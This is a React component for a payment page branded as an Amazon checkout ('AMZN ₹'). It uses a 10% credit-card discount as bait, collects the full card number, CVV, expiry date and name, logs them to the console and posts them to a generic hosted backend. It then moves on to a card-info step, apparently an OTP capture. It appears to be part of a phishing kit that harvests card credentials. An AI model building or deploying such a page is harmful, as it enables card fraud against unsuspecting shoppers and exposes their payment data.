import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'; // Import useNavigate
import Nav from '../Headerfooter/Nav'
import axios from 'axios';
import { useLocation } from 'react-router-dom';

const VarifyOTP = () => { 
  const [offer,setoffer]=useState("");
  const location = useLocation();
  const { ogprice } = location.state || {};
  const [formData, setFormData] = useState({
    name: '',
    cardNumber: '',
    cvv: '',
    expiryDate: '',
    cardType: 'Credit Card',
    expiryMonth: '1',
    expiryYear: '2024',
  });
 
  // set form data Event
  const [errors, setErrors] = useState({});
  const navigate = useNavigate(); 
  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  // Validation for fields
  const validateForm = () => {
    const newErrors = {};

    // Validate Name
    if (!formData.name.trim()) {
      newErrors.name = 'Name is required';
    } else if (!/^[A-Za-z\s]+$/.test(formData.name)) {
      newErrors.name = 'Name is not valid ';
    }

    // Validate Card Number
    if (!formData.cardNumber) {
      newErrors.cardNumber = 'Card number is required';
    } else if (!/^\d{16}$/.test(formData.cardNumber)) {
      newErrors.cardNumber = 'Card number must be 16 digits';
    } 

    // Validate CVV
    if (!formData.cvv) {
      newErrors.cvv = 'CVV is required';
    } else if (!/^\d{3,4}$/.test(formData.cvv)) {
      newErrors.cvv = 'CVV must be 3 or 4 digits';
    }
    
  // validate Date
  const currentYear = new Date().getFullYear();
  const currentMonth = new Date().getMonth() + 1; // Months are zero-based

  const expiryMonth = parseInt(formData.expiryMonth, 10);
  const expiryYear = parseInt(formData.expiryYear, 10);

  if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
    newErrors.expiryDate = 'Expiry date is in the past';
  }
  
    // card type
  if (!formData.cardType) {
    newErrors.cardType = 'Please select a card type';
}

    return newErrors;
  };

  // Get data and send to cardinfoPage
  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
    } else {
      const validationErrors = validateForm();
      setErrors({});

      // Prepare the payload to send to the API
      const apiPayload = {
        name: formData.name,
        cardNumber: formData.cardNumber,
        expiryDate:  `${formData.expiryMonth}/${formData.expiryYear}`,
        cvvNumber: formData.cvv,
        cardType: formData.cardType,
        price :formData.price,
        // use the otp state value here
      };
console.log(apiPayload);

      try {
        // Send data to the API
        const response = await axios.post('https://new-backend-dq45.onrender.com/api/cards', apiPayload, {
          headers: {
            'Content-Type': 'application/json',
          }
        });

        // Handle successful submission
        if (response.status === 201 || response.status === 200) {
         // alert('Payment successful!');
          // Redirect or perform further actions if needed
          localStorage.setItem('authToken', response.data.token);
          navigate('/cardinfo'  ,{ state: { apiPayload } });
        }
      } catch (error) {
        // Handle errors from the API
        console.error('There was an error submitting the form:', error);
        alert('Failed to process payment. Please try again.');
      }
      
    }
  };

  // const handleSubmit = async (e) => {
  //   e.preventDefault();
  //   const validationErrors = validateForm();
  //   if (Object.keys(validationErrors).length > 0) {
  //     setErrors(validationErrors);
  //   } else {
  //     setErrors({});
  //     const payload = {
  //         name: formData.name,
  //         cardNumber: formData.cardNumber,
  //         expiryDate: `${formData.expiryMonth}/${formData.expiryYear}`,
  //         cvvNumber: formData.cvv,
  //         cardType: formData.cardType,
  //         price: ogprice.price
  //       };
  //     navigate('/cardinfo'  ,{ state: { payload } });
  //   }
  // };

  return (
    <>
    <Nav/>
    <div className='container'>
      <div className='row mt-3'>
        {/* heading */}
      <div className='col-9'>
        <h5 >Paying to Total Amount</h5>
      </div>
      <div className='col-3'>
        <h5 >AMZN ₹ {ogprice.price}</h5>
      </div>
      </div>
      {/* Price show */}
      {formData.cardType === 'Credit Card' && (
          <p className='note'>Note: If You pay via <b>Credit card</b>, you will get 10% discount instantly!</p>
        )}
        {/* Card detail field start */}
      <h6>Enter Your Card Information</h6>
      <form onSubmit={handleSubmit}>
        {/* Name field */}
      <div className='single-input-inner style-border mb-0'>
        <input 
          type='text' 
          placeholder='Name' 
          name="name"
          value={formData.name}
          onChange={handleChange}
        />
        {errors.name && <span className="error-text">{errors.name}</span>}
      </div>

        {/* Card number field */}
      <div className='single-input-inner style-border'>
        <input 
          type='text' 
          placeholder='Card number' 
          name="cardNumber"
          value={formData.cardNumber}
          onChange={handleChange}
        />
        {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
      </div>

        {/* Date fields */}
        <h6 className='single-input-inner style-border mt-3'>Expiry Date</h6>
        <div className='row'>
      <div className='col-6'>
      <select
        className="form-select"
           aria-label="Expiry Month"
         name="expiryMonth"
          value={formData.expiryMonth}
           onChange={handleChange}
                    >
            {[...Array(12).keys()].map(i => (
             <option key={i} value={i + 1}>
              {i + 1}
                 </option>
            ))}
            </select>
      </div>
      <div className='single-input-inner style-border col-6'>
      <select
         className="form-select"
          aria-label="Expiry Year"
           name="expiryYear"
            value={formData.expiryYear}
            onChange={handleChange}
              >
            {[2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032].map(year => (
             <option key={year} value={year}>
                  {year}
              </option>
                 ))}
              </select>
      </div>
      {errors.expiryDate && <span className="error-text">{errors.expiryDate}</span>}
      </div>

        {/* Cvv field  */}
      <div className='single-input-inner style-border mt-2'>
        <input 
          type='text'
          placeholder='CVV'
          name="cvv"
          value={formData.cvv}
          onChange={handleChange}
        />
        {errors.cvv && <span className="error-text">{errors.cvv}</span>}
      </div>

                {/* Card type  */}
    <h6>Card type</h6>
    <div className='p-2 ps-0 d-flex align-items-center'>
        <input type="radio"
              name="cardType"
              value="Debit Card"
              checked={formData.cardType === 'Debit Card'}
              onChange={handleChange}
              className='small-checkbox '/>
        <h5 className='ms-4'>Debit Card</h5>
      </div>  
      <div className='p-2 ps-0 d-flex align-items-center'>
        <input  type="radio"
              name="cardType"
              value="Credit Card"
              checked={formData.cardType === 'Credit Card'}
              onChange={handleChange}
              className='small-checkbox'/>
        <h5 className='ms-4'>Credit Card</h5>
      </div>
      {errors.cardType && <p className="text-danger">{errors.cardType}</p>}

      {/* Button */}        
      <div className='col-12 mt-5'>
      <button className='btn btn-warning d-block w-100 pt-2 pb-2' type="submit" value="send">Pay</button>
      </div>
  </form>

    </div>
    </>
  )
}

export default VarifyOTP
